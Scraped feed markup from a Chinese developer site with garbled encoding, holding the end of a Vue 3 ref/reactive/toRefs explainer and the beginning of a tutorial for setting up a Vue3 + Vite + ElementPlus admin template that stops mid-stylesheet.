<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bcb5cb99b0542c0b43dc6de5cdcd1e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5peg5rav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461469&amp;x-signature=zLbFLqU5euf1Z2Ipsieg04u9NM8%3D" alt="" loading="lazy"/><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/>â€‹ç¼–è¾‘</p>
<blockquote>
<p>å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­,Â ä¸€ä¸ªåŸºæœ¬ç±»å‹çš„å“åº”å¼æ•°æ®ï¼Œå¿…é¡»ä½¿ç”¨<code>ref</code> ,å¯¹è±¡å±‚çº§ä¸æ·±ref,reactiveä¸¤è€…éƒ½è¡Œ,å±‚çº§æ¯”è¾ƒå¤šä¸€èˆ¬ç”¨reactive(å®é™…å¯ä»¥refä¸€æŠŠæ¢­,å°±æ˜¯ä»£ç é‡Œé¢.valueæ¯”è¾ƒå¤š,çœ‹èµ·æ¥ä¸ç¾è§‚)</p>
</blockquote>
<h2 data-id="heading-5">toRefså’ŒtoRefÂ </h2>
<ul>
<li>ä½œç”¨ï¼šå°†ä¸€ä¸ªå“åº”å¼å¯¹è±¡ä¸­çš„æ¯ä¸€ä¸ªå±æ€§ï¼Œè½¬æ¢ä¸º<code>ref</code>å¯¹è±¡ã€‚å¸¸ç”¨äº <strong>è§£æ„</strong> æ—¶ä¿æŒå“åº”å¼ã€‚</li>
<li>å¤‡æ³¨ï¼š<code>toRefs</code>ä¸<code>toRef</code>åŠŸèƒ½ä¸€è‡´ï¼Œä½†<code>toRefs</code>å¯ä»¥æ‰¹é‡è½¬æ¢ã€‚</li>
</ul>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å§“åï¼š{{people.name}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å¹´é¾„ï¼š{{people.age}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> {reactive} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">let</span> people = <span class="hljs-title function_">reactive</span>({<span class="hljs-attr">name</span>:<span class="hljs-string">'æµ‹è¯•'</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>})
<span class="hljs-comment">// é€šè¿‡toRefs å°†peopleä¸­çš„å¤šä¸ªå±æ€§å–å‡º,å¹¶ä¿æŒå“åº”å¼èƒ½åŠ›</span>
<span class="hljs-keyword">let</span> {name,age} = <span class="hljs-title function_">toRefs</span>(people)
<span class="hljs-comment">// é€šè¿‡toRef å°†peopleä¸­çš„æŸä¸ªå±æ€§å–å‡º,å¹¶ä¿æŒå“åº”å¼èƒ½åŠ›</span>
<span class="hljs-keyword">let</span> age = <span class="hljs-title function_">toRef</span>(people,<span class="hljs-string">'age'</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-6">é¢è¯•é‡ç‚¹</h2>
<h4 data-id="heading-7">ä¸ºä»€ä¹ˆrefè¦ç”¨.value</h4>
<blockquote>
<ul>
<li><strong>åŸºæœ¬æ•°æ®ç±»å‹</strong>ï¼š<code>ref</code> åŒ…è£…çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå¦‚æ•°å­—ã€å­—ç¬¦ä¸²ï¼‰å¹¶ä¸ç›´æ¥æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒä»¬æ˜¯åŸå§‹å€¼ã€‚å› æ­¤ï¼Œ<code>ref</code> ä½¿ç”¨ <code>.value</code> æ¥è®¿é—®æˆ–ä¿®æ”¹å®é™…çš„å€¼ã€‚</li>
<li><strong>åŒ…è£…è¡Œä¸º</strong>ï¼š<code>ref</code> æ˜¯ä¸ºäº†è®© Vue è¿½è¸ªè¿™äº›æ•°æ®çš„å˜åŒ–å¹¶ä¿æŒå“åº”å¼ï¼Œä½¿ç”¨ <code>.value</code> æ˜¯ Vue è®¾è®¡çš„ä¸€éƒ¨åˆ†ï¼Œç”¨æ¥æ˜ç¡®åŒºåˆ†åŸå§‹å€¼å’Œå“åº”å¼å¯¹è±¡ã€‚</li>
</ul>
</blockquote>
<h4 data-id="heading-8">ä¸ºä»€ä¹ˆreactiveä¸ä½¿ç”¨.value</h4>
<blockquote>
<ul>
<li><code>reactive</code> æ˜¯é€šè¿‡ <strong>ä»£ç†å¯¹è±¡</strong> æ¥å®ç°å“åº”å¼çš„ã€‚<code>reactive</code> è¿”å›çš„æ˜¯ä¸€ä¸ª <strong>ä»£ç†å¯¹è±¡</strong>ï¼Œå½“ä½ è®¿é—®å¯¹è±¡çš„å±æ€§æ—¶ï¼Œä»£ç†ä¼šå¤„ç† getter å’Œ setter æ“ä½œæ¥å®ç°å“åº”å¼ã€‚</li>
<li>è¿™ç§æ–¹å¼æ˜¯ Vue 3 ä¸­çš„ <strong>Proxy</strong> API å·¥ä½œæœºåˆ¶çš„ä½“ç°ï¼Œå› æ­¤ä¸éœ€è¦ <code>.value</code>ï¼Œå¯ä»¥ç›´æ¥è®¿é—®å¯¹è±¡çš„å±æ€§ã€‚</li>
</ul>
</blockquote>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰‹æ‘¸æ‰‹å¿«é€Ÿæ­å»º Vue3 + ElementPlus åå°ç®¡ç†ç³»ç»Ÿæ¨¡æ¿ï¼Œä½¿ç”¨ JavaScript]]></title>    <link>https://juejin.cn/post/7584014975241879562</link>    <guid>https://juejin.cn/post/7584014975241879562</guid>    <pubDate>2025-12-16T03:34:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584014975241879562" data-draft-id="7581412607061180462" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰‹æ‘¸æ‰‹å¿«é€Ÿæ­å»º Vue3 + ElementPlus åå°ç®¡ç†ç³»ç»Ÿæ¨¡æ¿ï¼Œä½¿ç”¨ JavaScript"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-16T03:34:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘æŒ–åœŸ"/> <meta itemprop="url" content="https://juejin.cn/user/3681619519481069"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰‹æ‘¸æ‰‹å¿«é€Ÿæ­å»º Vue3 + ElementPlus åå°ç®¡ç†ç³»ç»Ÿæ¨¡æ¿ï¼Œä½¿ç”¨ JavaScript
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3681619519481069/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘æŒ–åœŸ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:34:51.000Z" title="Tue Dec 16 2025 03:34:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3 + Vite + ElementPlus + JavaScript åå°ç®¡ç†ç³»ç»Ÿæ¨¡æ¿</h2>
<h3 data-id="heading-1">åºŸè¯å†™åœ¨å‰é¢</h3>
<p>å¯¹äºå’±è¿™äº›åœ¨å°å…¬å¸æ‘¸çˆ¬æ»šæ‰“ï¼ˆæ··åƒç­‰æ­»ï¼‰çš„å‰ç«¯èƒ¶æ°´å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œç»å¸¸é¢å¯¹çš„ä¸šåŠ¡å°±æ˜¯å„ç§çº·ç¹å¤æ‚ï¼ˆå¤§å·®ä¸å·®ï¼‰çš„åå°ç®¡ç†ç³»ç»Ÿäº†ï¼Œä»¥å‰æ˜¯ <code>Vue2 + ElementUI</code> ä¸€æŠŠæ¢­ï¼Œç°åœ¨éƒ½å¿« 2026 å¹´äº† broï¼ŒAI éƒ½ä¸å†™å…¬å…ƒå‰çš„é‚£ä¸€å¥—äº†ï¼Œå’±å†ä¸åŠ¨ä¸€åŠ¨æŒªä¸€æŒªï¼Œé‚£çœŸæœ‰ç‚¹è¯´ä¸è¿‡å»äº†ï¼Œæ–°é¡¹ç›®è¿˜æ˜¯ä¸Šç‚¹ç•¥æ–°ä¸€ç‚¹çš„æ´»æ•´æ•´å§</p>
<p>è¯è¯´å°å…¬å¸è®²ç©¶ä¸€ä¸ªä»€ä¹ˆï¼Œé‚£å°±æ˜¯ä¸è®²ç©¶ï¼Œé¢é¢ï¼Œè®²ç©¶ä¸€ä¸ªå¿«é€Ÿå¼€å‘ä¸šåŠ¡ï¼Œè¿™é‡Œå°±ä¸å¾—ä¸æä¸€ä¸‹ JavaScript æœ€åˆçš„çµæ´»æ€§äº†ï¼Œç”¨ TypeScript æ€»æ„Ÿè§‰æœ‰ç‚¹è‡ªç¼šæ‰‹è„šï¼Œå¤§ç‚®æ‰“è‹è‡çš„èµ¶è„šï¼Œè€Œä¸”å°±ç ¸é—¨é‚£ä¸¤ç¢—æ°´ï¼Œå†™åˆ°æœ€åä¹Ÿæ˜¯ anyScriptã€‚æ‰€ä»¥è¿˜æ˜¯ä½¿ç”¨ JavaScript å§ï¼Œä¸è¿‡è¯¥æœ‰çš„è§„èŒƒè¿˜æ˜¯å¾—æœ‰çš„ï¼Œä¸ç„¶æˆçŸ³å±±äº†æ‰£åˆ°å’±å¤´ä¸Šä¹Ÿä¸å¥½å¤„ç†ä¸æ˜¯</p>
<p>ok è¯ä¸å¤šæ¯ï¼Œå‡†å¤‡å¼€æ•´ï¼ï¼ˆè¿›å…¥æ­£é¢˜å°±ä¸åºŸè¯äº†ï¼Œä»€ä¹ˆï¼Ÿä½ é—®æˆ‘å‰é¢ä¸ºå•¥è¦åºŸè¯ï¼ŒåºŸè¯ï¼Œä¸æ˜¯åºŸè¯æ­£ç»äººè°çœ‹å•Šï¼‰</p>
<hr/>
<h3 data-id="heading-2">åˆ›å»ºé¡¹ç›®</h3>
<p>ç¯å¢ƒå‡†å¤‡ï¼š</p>
<ul>
<li>nodejs ç‰ˆæœ¬ï¼šå»ºè®®å¤§äº 20</li>
<li>ä½¿ç”¨ pnpm</li>
<li>VSCode æ’ä»¶ - <code>Vue (Official)</code></li>
</ul>
<p>æ‰¾ä¸€ä¸ªçœ‹å¾—é¡ºçœ¼çš„ç›®å½•æ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm create vite elementplus-js-admin -- --template vue
</code></pre>
<p>è§£é‡Šä¸‹è¿™æ®µå‘½ä»¤å¹²å•¥çš„ï¼š</p>



































<table><thead><tr><th>åˆ†æ®µ</th><th>å«ä¹‰</th><th>æ³¨æ„äº‹é¡¹</th></tr></thead><tbody><tr><td><code>pnpm create</code></td><td>è°ƒç”¨ <code>pnpm</code> çš„ã€Œè„šæ‰‹æ¶ç”Ÿæˆå™¨ã€</td><td>ç­‰ä»·äº <code>npm create</code> / <code>yarn create</code></td></tr><tr><td><code>vite</code></td><td>å‘Šè¯‰ <code>pnpm</code> è¦æ‹‰å–çš„è„šæ‰‹æ¶åŒ…æ˜¯ <code>create-vite</code></td><td>åº•å±‚ä¼šè¿è¡Œ <code>npx create-vite</code></td></tr><tr><td><code>elementplus-admin-js</code></td><td>ç”Ÿæˆçš„<strong>é¡¹ç›®æ–‡ä»¶å¤¹å</strong></td><td>ä¸è¦å¸¦ç©ºæ ¼ã€ç‰¹æ®Šç¬¦å·</td></tr><tr><td><code>--</code></td><td><strong>å‚æ•°åˆ†éš”ç¬¦</strong></td><td>å‘Šè¯‰ pnpmï¼šåé¢æ˜¯ä¼ ç»™è„šæ‰‹æ¶çš„å‚æ•°ï¼Œä¸æ˜¯ç»™ pnpm çš„</td></tr><tr><td><code>--template vue</code></td><td>ä¼ ç»™ <code>create-vite</code> çš„å‚æ•°<strong>æŒ‡å®šæ¨¡æ¿</strong></td><td>åªèƒ½æ˜¯ <code>vue</code>, <code>react</code>, <code>vanilla</code>â€¦ ä¹‹ä¸€</td></tr></tbody></table>
<p>è¿›å…¥åˆ°åˆšåˆ›å»ºçš„ç›®å½•å¹¶æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> elementplus-js-admin
pnpm dev
</code></pre>
<p>å¥½äº†ï¼Œå—–çš„ä¸€ä¸‹ï¼Œå¤§åŠŸå‘Šæˆï¼ˆå°±é—®ä½ å¿«ä¸å¿«å§ï¼‰</p>
<h3 data-id="heading-3">é…ç½®è·¯å¾„åˆ«å</h3>
<p><code>vue.config.js</code> ä¸­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./src'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>)),
    },
  },
})
</code></pre>
<p>å¦å¤–ï¼Œæƒ³è¦è®© VSCode åœ¨è¾“å…¥ <code>@</code> çš„æ—¶å€™æœ‰æ™ºèƒ½æç¤ºï¼Œéœ€è¦æ–°å»º <code>jsconfig.json</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"."</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"paths"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"@/*"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"src/*"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"dist"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-4">Element Plus</h3>
<h4 data-id="heading-5">å®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm add element-plus
</code></pre>
<h4 data-id="heading-6">é…ç½®è‡ªåŠ¨å¯¼å…¥ (æ¨è)</h4>
<p>ä¸ºäº†è·å¾—æœ€ä½³çš„å¼€å‘ä½“éªŒå’Œæ‰“åŒ…ä½“ç§¯ä¼˜åŒ–ï¼Œæ¨èä½¿ç”¨<strong>è‡ªåŠ¨å¯¼å…¥</strong>ã€‚éœ€è¦å®‰è£…ä¸¤ä¸ªæ’ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D unplugin-vue-components unplugin-auto-import
</code></pre>
<p>ç®€å•ä»‹ç»ä¸€ä¸‹è¿™ä¸¤ä¸ªæ’ä»¶çš„ä½œç”¨ï¼š</p>
<ul>
<li>AutoImport ï¼šè®©ä½ åœ¨ JS ä»£ç ä¸­ç›´æ¥ä½¿ç”¨ ElementPlus çš„ <strong>API</strong></li>
<li>Components ï¼šè®©ä½ åœ¨æ¨¡æ¿ä¸­ç›´æ¥ä½¿ç”¨ ElementPlus çš„<strong>ç»„ä»¶</strong></li>
</ul>
<p>å¦‚æœè¦ä½¿ç”¨ ElementPlus çš„å›¾æ ‡ï¼Œè¿˜éœ€è¦å®‰è£…è‡ªåŠ¨å¯¼å…¥ icons ä¾èµ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D unplugin-icons
</code></pre>
<p>ç„¶åä¿®æ”¹ <code>vite.config.js</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>
<span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">AutoImport</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-auto-import/vite'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">IconsResolver</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-icons/resolver'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Icons</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-icons/vite'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElementPlusResolver</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-vue-components/resolvers'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Components</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-vue-components/vite'</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-comment">// https://vite.dev/config/</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title class_">AutoImport</span>({
      <span class="hljs-comment">// è‡ªåŠ¨å¯¼å…¥ vue ç›¸å…³å‡½æ•°ï¼Œå¦‚ï¼šref, reactive, toRef ç­‰</span>
      <span class="hljs-comment">// imports: ['vue'], // æˆ‘æ˜¯è¯´å¦‚æœï¼Œå¯¹ Vue3 è¿˜ä¸ç†Ÿï¼Œå»ºè®®æ³¨é‡Šè¯¥è¡Œï¼Œæ‰‹åŠ¨å¯¼å…¥ vue ç›¸å…³å‡½æ•°</span>
      <span class="hljs-attr">resolvers</span>: [
        <span class="hljs-comment">// è‡ªåŠ¨å¯¼å…¥ Element Plus ç›¸å…³å‡½æ•°ï¼Œå¦‚ï¼šElMessage, ElNotification ç­‰</span>
        <span class="hljs-title class_">ElementPlusResolver</span>(),
        <span class="hljs-comment">// è‡ªåŠ¨å¯¼å…¥å›¾æ ‡ç»„ä»¶</span>
        <span class="hljs-title class_">IconsResolver</span>(),
      ],
      <span class="hljs-attr">eslintrc</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> }, <span class="hljs-comment">// ç”Ÿæˆ .eslintrc-auto-import.jsonï¼Œeslint ä¸æŠ¥é”™</span>
    }),
    <span class="hljs-title class_">Components</span>({
      <span class="hljs-attr">resolvers</span>: [
        <span class="hljs-comment">// è‡ªåŠ¨æ³¨å†Œ Element Plus ç»„ä»¶</span>
        <span class="hljs-title class_">ElementPlusResolver</span>(),
        <span class="hljs-comment">// è‡ªåŠ¨æ³¨å†Œå›¾æ ‡ç»„ä»¶</span>
        <span class="hljs-title class_">IconsResolver</span>({
          <span class="hljs-attr">enabledCollections</span>: [<span class="hljs-string">'ep'</span>], <span class="hljs-comment">// element-plus å›¾æ ‡åº“</span>
        }),
      ],
    }),
    <span class="hljs-title class_">Icons</span>({
      <span class="hljs-comment">// è‡ªåŠ¨å®‰è£…å›¾æ ‡åº“</span>
      <span class="hljs-attr">autoInstall</span>: <span class="hljs-literal">true</span>,
    }),
  ],
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./src'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>)),
    },
  },
})
</code></pre>
<p>å®é™…ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- Components æ’ä»¶å¤„ç†è¿™äº›ç»„ä»¶çš„è‡ªåŠ¨æ³¨å†Œ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"showMessage"</span>&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  
  <span class="hljs-comment">&lt;!-- å›¾æ ‡ç»„ä»¶ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-search</span> /&gt;</span>
  
  <span class="hljs-comment">&lt;!-- å›¾æ ‡æŒ‰é’® --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-CirclePlus</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-icon--left"</span> /&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">showMessage</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// AutoImport æ’ä»¶å¤„ç†è¿™äº› API çš„è‡ªåŠ¨å¯¼å…¥</span>
  <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'æ“ä½œæˆåŠŸï¼'</span>);
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">ä¸»é¢˜é…ç½®</h3>
<p>æ–°å»º <code>src/styles/theme.scss</code>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/* Element Plus Theme Overrides */</span>
<span class="hljs-comment">/* https://element-plus.org/en-US/guide/theme.html#how-to-override-it */</span>
<span class="hljs-keyword">@forward</span> <span class="hljs-string">'element-plus/theme-chalk/src/common/var.scss'</span> with (
  <span class="hljs-variable">$colors</span>: (
    <span class="hljs-string">'primary'</span>: (
